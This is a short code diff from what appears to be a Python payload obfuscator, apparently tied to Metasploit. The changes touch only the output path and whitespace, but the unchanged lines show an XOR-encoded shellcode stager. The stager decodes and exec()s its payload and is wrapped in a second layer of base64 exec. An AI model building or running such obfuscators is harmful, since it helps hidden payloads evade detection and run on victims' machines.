@@ -60,8 +60,7 @@ class _MSF_Call:
 
 if __name__=='__main__':
    _MSF_Call()   
-
-
+   
 class Xor_class :
 
     def __init__(self):
@@ -98,8 +97,7 @@ class Xor_class :
         self.Xor_Payload = bytes([ I  ^ L for I , L in zip(self.payload ,self.Value_Key) ])
    
     def Fainal_Stage(self,**kwargs) : 
-        
-        with open(self.args.output,'w') as XP_load:
+        with open(os.getcwd()+"/"+'StoreCode/'+self.args.output,'w') as XP_load:
             if self.args.load:
                 XP_load1 = 'shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
                 "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
@@ -111,6 +109,6 @@ class Xor_class :
                 "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
                 'de_set = base64.b64decode(de_code).decode("utf-8")'+'\n'+'exec(de_set)'
                 XP_load.write("import base64\nexec(base64.b64decode("+str(base64.b64encode((XP_load1.encode())))+'))')   
-
+        
 if __name__=='__main__':
    Xor_class()   
